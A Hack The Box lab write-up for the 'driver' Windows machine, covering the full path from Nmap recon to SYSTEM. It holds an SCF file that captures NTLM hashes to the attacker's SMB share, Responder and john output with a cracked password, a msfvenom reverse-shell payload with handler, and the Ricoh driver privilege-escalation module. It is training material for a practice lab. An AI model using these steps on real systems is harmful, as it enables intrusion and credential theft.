@@ -1,0 +1,637 @@
+#+setupfile: ../templates/level-0.org
+#+summary: TODO
+#+filetags: :HTB:write-up:hacking:
+#+title: HTB | driver
+* Recon
+** Nmap
+#+begin_example
+Nmap scan report for 10.129.233.76
+Host is up (0.17s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods:
+|_  Potentially risky methods: TRACE
+135/tcp open  msrpc        Microsoft Windows RPC
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2008|10 (88%), FreeBSD 6.X (86%)
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 (88%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows 10 1511 - 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2022-01-13T21:59:41
+|_  start_date: 2022-01-13T21:57:54
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 67.27 seconds
+#+end_example
+*** All ports
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/driver ]
+└─> $ nmap -p- driver.htb
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 14:44 CET
+Nmap scan report for driver.htb (10.129.233.76)
+Host is up (0.14s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 348.93 seconds
+#+end_example
+*** Port 5985 sV sC
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/driver ]
+└─> $ sudo nmap -sC -sV -p5985 driver.htb
+[sudo] password for c3lphie:
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 14:51 CET
+Nmap scan report for driver.htb (10.129.233.76)
+Host is up (0.080s latency).
+
+PORT     STATE SERVICE VERSION
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
+#+end_example
+
+** web recon
+http basic auth
+shitty password
+: admin:admin
+
+~index.php~
+#+DOWNLOADED: screenshot @ 2022-01-14 11:24:27
+[[file:Recon/2022-01-14_11-24-27_screenshot.png]]
+
+
+
+~fw_upload.php~
+#+DOWNLOADED: screenshot @ 2022-01-14 11:27:15
+[[file:Recon/2022-01-14_11-27-15_screenshot.png]]
+
+We can upload shit
+so but what?
+we have some different printers:
+ - HTB DesignJet
+ - HTB Ecotank
+ - HTB Laserjet pro
+ - HTB Mono
+
+
+PHP version: 7.3.25
+* Exploit idea
+After a bit of reasearching i found this: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+We have file upload, but cant get to upload directory.
+It however get uploaded to the file share
+
+#+begin_src conf
+  [Shell]
+  Command=2
+  IconFile=\\10.10.17.47\share\give-hash-pls.ico
+  [Taskbar]
+  Command=ToggleDesktop
+#+end_src
+
+And catch username and password hash responder:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/repositories/Responder ]
+└─> $ sudo python Responder.py -w --lm -v -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+    
+    --- [snip] ---
+    
+[SMB] NTLMv2 Client   : ::ffff:10.129.233.76
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:5adfba7aee375cdd:78E33EF577E5F48C0D27A049FDDC6564:01010000000000008752E5DD7809D80130B6ABCBAAA2C5A000000000020000000000000000000000
+[+] Exiting...
+#+end_example
+
+Which we can crack with ~john~
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/driver ]
+└─> $ john --wordlist=$REPOS/SecLists/Passwords/Leaked-Databases/rockyou.txt hash.txt
+--------------------------------------------------------------------------
+The library attempted to open the following supporting CUDA libraries,
+but each of them failed.  CUDA-aware support is disabled.
+libcuda.so.1: cannot open shared object file: No such file or directory
+libcuda.dylib: cannot open shared object file: No such file or directory
+/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory
+/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory
+If you are not interested in CUDA-aware support, then run with
+--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested
+in CUDA-aware support, then try setting LD_LIBRARY_PATH to the location
+of libcuda.so.1 to get passed this issue.
+--------------------------------------------------------------------------
+Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
+Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+liltony          (tony)
+1g 0:00:00:00 DONE (2022-01-14 13:12) 50.00g/s 1843Kp/s 1843Kc/s 1843KC/s zombies..holabebe
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+#+end_example
+
+So now we have a user:
+: tony:liltony
+
+and workgroup also
+: DRIVER
+
+** Enum4linux
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/driver ]
+└─> $ enum4linux -a -u tony -p  liltony driver.htb                                                                    
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 14 14:04:03 2022
+
+ =========================================( Target Information )=========================================
+
+Target ........... driver.htb
+RID Range ........ 500-550,1000-1050
+Username ......... 'tony'
+Password ......... 'liltony'
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ =============================( Enumerating Workgroup/Domain on driver.htb )=============================
+
+
+[E] Can't find workgroup/domain
+
+
+
+ =================================( Nbtstat Information for driver.htb )=================================
+
+Looking up status of 10.129.233.76
+No reply from 10.129.233.76
+
+ ====================================( Session Check on driver.htb )====================================
+
+
+[+] Server driver.htb allows sessions using username 'tony', password 'liltony'
+
+
+ =================================( Getting domain SID for driver.htb )=================================
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+ ====================================( OS information on driver.htb )====================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for driver.htb from srvinfo:
+        DRIVER.HTB     Wk Sv NT
+        platform_id     :       500
+        os version      :       10.0
+        server type     :       0x1003
+
+
+ ========================================( Users on driver.htb )========================================
+
+index: 0x1 RID: 0x1f4 acb: 0x00000210 Account: Administrator    Name: (null)    Desc: Built-in account for administering the computer/domain
+index: 0x2 RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount   Name: (null)    Desc: A user account managed by the system.
+index: 0x3 RID: 0x1f5 acb: 0x00000215 Account: Guest    Name: (null)    Desc: Built-in account for guest access to the computer/domain
+index: 0x4 RID: 0x3eb acb: 0x00000210 Account: tony     Name: (null)    Desc: (null)
+
+user:[Administrator] rid:[0x1f4]
+user:[DefaultAccount] rid:[0x1f7]
+user:[Guest] rid:[0x1f5]
+user:[tony] rid:[0x3eb]
+
+ ==================================( Share Enumeration on driver.htb )==================================
+
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on driver.htb
+
+//driver.htb/ADMIN$     Mapping: DENIED Listing: N/A Writing: N/A
+//driver.htb/C$ Mapping: DENIED Listing: N/A Writing: N/A
+
+[E] Can't understand response:
+
+NT_STATUS_NO_SUCH_FILE listing \*
+//driver.htb/IPC$       Mapping: N/A Listing: N/A Writing: N/A
+
+ =============================( Password Policy Information for driver.htb )=============================
+
+
+[E] Unexpected error from polenum:
+
+Traceback (most recent call last):
+  File "/usr/bin/polenum", line 16, in <module>
+    from impacket.dcerpc.v5.rpcrt import DCERPC_v5
+ModuleNotFoundError: No module named 'impacket'
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 0
+
+
+ ========================================( Groups on driver.htb )========================================
+
+
+[+] Getting builtin groups:
+
+group:[Access Control Assistance Operators] rid:[0x243]
+group:[Administrators] rid:[0x220]
+group:[Backup Operators] rid:[0x227]
+group:[Cryptographic Operators] rid:[0x239]
+group:[Distributed COM Users] rid:[0x232]
+group:[Event Log Readers] rid:[0x23d]
+group:[Guests] rid:[0x222]
+group:[Hyper-V Administrators] rid:[0x242]
+group:[IIS_IUSRS] rid:[0x238]
+group:[Network Configuration Operators] rid:[0x22c]
+group:[Performance Log Users] rid:[0x22f]
+group:[Performance Monitor Users] rid:[0x22e]
+group:[Power Users] rid:[0x223]
+group:[Remote Desktop Users] rid:[0x22b]
+group:[Remote Management Users] rid:[0x244]
+group:[Replicator] rid:[0x228]
+group:[System Managed Accounts Group] rid:[0x245]
+group:[Users] rid:[0x221]
+
+[+]  Getting builtin group memberships:
+
+Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
+Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
+Group: Users' (RID: 545) has member: DRIVER\tony
+Group: Guests' (RID: 546) has member: DRIVER\Guest
+Group: Administrators' (RID: 544) has member: DRIVER\Administrator
+Group: Remote Management Users' (RID: 580) has member: DRIVER\tony
+Group: System Managed Accounts Group' (RID: 581) has member: DRIVER\DefaultAccount
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+group:[None] rid:[0x201]
+
+[+]  Getting domain group memberships:
+
+Group: 'None' (RID: 513) has member: DRIVER\Administrator
+Group: 'None' (RID: 513) has member: DRIVER\Guest
+Group: 'None' (RID: 513) has member: DRIVER\DefaultAccount
+Group: 'None' (RID: 513) has member: DRIVER\tony
+
+ ===================( Users on driver.htb via RID cycling (RIDS: 500-550,1000-1050) )===================
+
+
+[I] Found new SID:
+S-1-5-21-3114857038-1253923253-2196841645
+
+[I] Found new SID:
+S-1-5-21-3114857038-1253923253-2196841645
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-21-3114857038-1253923253-2196841645
+
+[I] Found new SID:
+S-1-5-21-3114857038-1253923253-2196841645
+
+[+] Enumerating users using SID S-1-5-82-3006700770-424185619-1745488364-794895919 and logon username 'tony', password 'liltony'
+
+
+[+] Enumerating users using SID S-1-5-21-3114857038-1253923253-2196841645 and logon username 'tony', password 'liltony'
+
+S-1-5-21-3114857038-1253923253-2196841645-500 DRIVER\Administrator (Local User)
+S-1-5-21-3114857038-1253923253-2196841645-501 DRIVER\Guest (Local User)
+S-1-5-21-3114857038-1253923253-2196841645-503 DRIVER\DefaultAccount (Local User)
+S-1-5-21-3114857038-1253923253-2196841645-513 DRIVER\None (Domain Group)
+S-1-5-21-3114857038-1253923253-2196841645-1003 DRIVER\tony (Local User)
+
+[+] Enumerating users using SID S-1-5-80 and logon username 'tony', password 'liltony'
+
+
+[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'tony', password 'liltony'
+
+
+[+] Enumerating users using SID S-1-5-32 and logon username 'tony', password 'liltony'
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+
+ ================================( Getting printer info for driver.htb )================================
+
+result was WERR_INVALID_NAME
+
+
+enum4linux complete on Fri Jan 14 14:20:19 2022
+#+end_example
+
+** Getting foothold
+We got that winrm port open which gives RCE
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/driver ]
+└─> $ cme winrm driver.htb -u tony -p liltony -x whoami
+WINRM       10.129.233.76   5985   NONE             [*] None (name:driver.htb) (domain:None)
+WINRM       10.129.233.76   5985   NONE             [*] http://10.129.233.76:5985/wsman
+WINRM       10.129.233.76   5985   NONE             [+] None\tony:liltony (Pwn3d!)
+WINRM       10.129.233.76   5985   NONE             [+] Executed command
+WINRM       10.129.233.76   5985   NONE             driver\tony
+#+end_example
+
+Evil-winrm docker one-liner:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/driver ]
+└─> $ docker run --rm -ti --name evil-winrm -v "$(pwd)/ps1_scripts:/ps1_scripts" -v "$(pwd)/exe_files:/exe_files" -v "$(pwd)/data:/data" oscarakaelvis/evil-winrm -i 10.129.169.204 -u tony -p liltony -s '/ps1_scripts/' -e '/exe_files/'
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\tony\Documents>
+#+end_example
+
+And flag:
+#+begin_example
+*Evil-WinRM* PS C:\Users\tony> cd Desktop
+*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
+9dfcbe835f601d408efedb05073e8892
+#+end_example
+
+Now we create a meterpreter shell and upload it to the box
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/driver ]
+└─> $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.17.47" LPORT=4444 -f exe > meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+#+end_example
+Create our handler:
+#+begin_example
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_
+set payload windows/meterpreter/reverse_hop_http
+set payload windows/meterpreter/reverse_http
+set payload windows/meterpreter/reverse_http_proxy_pstore
+set payload windows/meterpreter/reverse_https
+set payload windows/meterpreter/reverse_https_proxy
+set payload windows/meterpreter/reverse_ipv6_tcp
+set payload windows/meterpreter/reverse_named_pipe
+set payload windows/meterpreter/reverse_nonx_tcp
+set payload windows/meterpreter/reverse_ord_tcp
+set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_tcp_allports
+set payload windows/meterpreter/reverse_tcp_dns
+set payload windows/meterpreter/reverse_tcp_rc4
+set payload windows/meterpreter/reverse_tcp_rc4_dns
+set payload windows/meterpreter/reverse_tcp_uuid
+set payload windows/meterpreter/reverse_winhttp
+set payload windows/meterpreter/reverse_winhttps
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > set lhost 10.10.17.47
+lhost => 10.10.17.47
+msf6 exploit(multi/handler) > run
+
+#+end_example
+
+And then execute meterpreter on the box:
+#+begin_example
+*Evil-WinRM* PS C:\temp> upload /exe_files/meterpreter.exe
+
+Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
+
+Info: Uploading /exe_files/meterpreter.exe to C:\temp\meterpreter.exe
+
+
+Data: 98400 bytes of 98400 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\temp> ls
+
+
+    Directory: C:\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/11/2021   7:20 AM                z87179L19
+-a----        1/15/2022   2:29 PM          73802 meterpreter.exe
+-a----        1/15/2022   2:10 PM          39530 winlog.log
+-a----        1/15/2022   2:07 PM        1677824 winPEASx86.exe
+
+
+*Evil-WinRM* PS C:\temp> Start-Process ./meterpreter.exe
+*Evil-WinRM* PS C:\temp>
+#+end_example
+
+#+begin_example
+[*] Started reverse TCP handler on 10.10.17.47:4444
+[*] Sending stage (175174 bytes) to 10.129.169.204
+[*] Meterpreter session 1 opened (10.10.17.47:4444 -> 10.129.169.204:49452) at 2022-01-15 16:30:52 +0100
+
+meterpreter >
+#+end_example
+
+Powershell history
+#+begin_example
+C:\Users\tony>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
+
+ping 1.1.1.1
+ping 1.1.1.1
+
+C:\Users\tony>
+#+end_example
+
+Googling the driver tells us that it is vulnerable to a LPE, which their coincidentaly is a metasploit module for
+#+begin_example
+meterpreter > bg
+[*] Backgrounding session 1...
+msf6 exploit(windows/local/bypassuac_eventvwr) > search RICOH
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank    Check  Description
+   -  ----                                        ---------------  ----    -----  -----------
+   0  exploit/windows/ftp/ricoh_dl_bof            2012-03-01       normal  Yes    Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow
+   1  exploit/windows/local/ricoh_driver_privesc  2020-01-22       normal  Yes    Ricoh Driver Privilege Escalation
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/local/ricoh_driver_privesc
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > use 1
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ricoh_driver_privesc) > show options
+
+Module options (exploit/windows/local/ricoh_driver_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.25     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+msf6 exploit(windows/local/ricoh_driver_privesc) > set session 1
+session => 1
+msf6 exploit(windows/local/ricoh_driver_privesc) > set lhost 10.10.17.47
+lhost => 10.10.17.47
+msf6 exploit(windows/local/ricoh_driver_privesc) > set lport 1337
+lport => 1337
+msf6 exploit(windows/local/ricoh_driver_privesc) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ricoh_driver_privesc) >
+#+end_example
+
+#+begin_example
+msf6 exploit(windows/local/ricoh_driver_privesc) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  DRIVER\tony @ DRIVER          10.10.17.47:4444 -> 10.129.169.204:49452 (10.129.
+                                                                   169.204)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DRIVER  10.10.17.47:1337 -> 10.129.169.204:49455 (10.129.
+                                                                   169.204)
+
+msf6 exploit(windows/local/ricoh_driver_privesc) > sessions 2
+[*] Starting interaction with 2...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter >
+#+end_example
+
+Move to admin desktop:
+
+#+begin_example
+meterpreter > ls
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2021-06-11 16:14:11 +0200  desktop.ini
+100444/r--r--r--  34    fil   2021-06-12 13:37:58 +0200  root.txt
+
+meterpreter > cat root.txt
+a905b98dbdc5c898fb08e302ba724ea
+#+end_example
